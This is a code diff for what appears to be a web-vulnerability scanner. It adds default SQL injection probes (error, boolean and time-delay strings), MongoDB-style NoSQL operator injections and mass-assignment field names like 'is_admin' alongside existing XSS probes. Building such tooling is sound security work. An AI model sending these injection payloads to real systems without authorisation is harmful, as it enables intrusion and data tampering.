@@ -30,9 +30,50 @@ DEFAULT_XSS_PAYLOADS: Tuple[str, ...] = (
     "<script>alert(1)</script>",
     '"><img src=x onerror=alert(1)>',
 )
-# No pre-existing defaults exist for these types; they fall back to empty.
-DEFAULT_SQLI_PAYLOADS: Tuple[str, ...] = ()
+# No pre-existing defaults exist for command payloads; they fall back to empty.
 DEFAULT_COMMAND_PAYLOADS: Tuple[str, ...] = ()
+# SQLi probe defaults by technique. Error-based first (fast, safe), then
+# boolean-differential, then time-based (slow — opt-in only).
+DEFAULT_SQLI_ERROR_PAYLOADS: Tuple[str, ...] = (
+    "'",
+    '"',
+    "')",
+    "' OR '1'='1",
+    "' OR 1=1-- -",
+)
+DEFAULT_SQLI_BOOLEAN_PAYLOADS: Tuple[str, ...] = (
+    "' AND 1=1-- -",
+    "' AND 1=2-- -",
+)
+DEFAULT_SQLI_TIME_PAYLOADS: Tuple[str, ...] = (
+    "' AND SLEEP(5)-- -",
+    "';SELECT pg_sleep(5)-- -",
+    "';WAITFOR DELAY '0:0:5'-- -",
+)
+# Fast, safe SQLi probes ship by default; time-based ones stay opt-in.
+DEFAULT_SQLI_PAYLOADS: Tuple[str, ...] = (
+    *DEFAULT_SQLI_ERROR_PAYLOADS,
+    *DEFAULT_SQLI_BOOLEAN_PAYLOADS,
+)
+# NoSQL operator injection probes (MongoDB-style).
+DEFAULT_NOSQLI_PAYLOADS: Tuple[str, ...] = (
+    '{"$gt": ""}',
+    '{"$ne": null}',
+    '{"$regex": ".*"}',
+    '{"$where": "sleep(5000)"}',
+)
+# Mass-assignment probe fields (privileged attributes to smuggle into
+# update/profile bodies).
+DEFAULT_MASSASSIGN_FIELDS: Tuple[str, ...] = (
+    "role",
+    "is_admin",
+    "isAdmin",
+    "admin",
+    "tenant_id",
+    "user_id",
+    "verified",
+    "permissions",
+)
 
 # Weakness-bucket name substrings that identify each family (case-insensitive).
 _BUCKET_PATTERNS: Dict[str, Tuple[str, ...]] = {
@@ -122,6 +163,21 @@ def xss_payloads() -> List[str]:
 def sqli_payloads() -> List[str]:
     """Real SQL-injection probe lines, or [] when the corpus is unavailable."""
     return _merged(DEFAULT_SQLI_PAYLOADS, _real_payloads("sqli"))
+
+
+def sqli_time_payloads() -> List[str]:
+    """Time-based SQLi probes (slow — opt-in only, never in default scans)."""
+    return list(DEFAULT_SQLI_TIME_PAYLOADS)
+
+
+def nosqli_payloads() -> List[str]:
+    """NoSQL operator-injection probe bodies."""
+    return list(DEFAULT_NOSQLI_PAYLOADS)
+
+
+def massassign_fields() -> List[str]:
+    """Privileged attribute names for mass-assignment probes."""
+    return list(DEFAULT_MASSASSIGN_FIELDS)
 
 
 def command_payloads() -> List[str]:
